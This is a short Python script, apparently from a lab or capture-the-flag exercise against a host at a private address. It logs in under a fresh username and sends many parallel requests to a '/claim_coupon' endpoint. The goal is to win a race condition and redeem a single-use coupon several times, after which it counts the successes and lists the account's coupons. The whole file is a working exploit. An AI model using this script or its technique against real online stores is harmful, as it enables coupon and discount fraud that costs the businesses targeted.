import requests, threading, time, sys

BASE = "http://10.0.185.129:80"
s = requests.Session()
uname = "race" + str(int(time.time()))
# login (POST /login with username)
r = s.post(BASE + "/login", data={"username": uname}, allow_redirects=False, timeout=60)
print("login:", r.status_code, uname)

results = []
def claim(i):
    try:
        r = s.post(BASE + "/claim_coupon", timeout=60)
        results.append((i, r.status_code, r.text))
    except Exception as e:
        results.append((i, "ERR", str(e)))

N = int(sys.argv[1]) if len(sys.argv) > 1 else 30
threads = []
for i in range(N):
    t = threading.Thread(target=claim, args=(i,))
    threads.append(t)
start = time.time()
for t in threads:
    t.start()
for t in threads:
    t.join()
print("elapsed:", time.time() - start)

success = [x for x in results if '"success":true' in x[2]]
print("success count:", len(success), "/", N)
for x in results:
    print(x)

# check coupons
r = s.get(BASE + "/my_coupons", timeout=60)
print("my_coupons:", r.text)
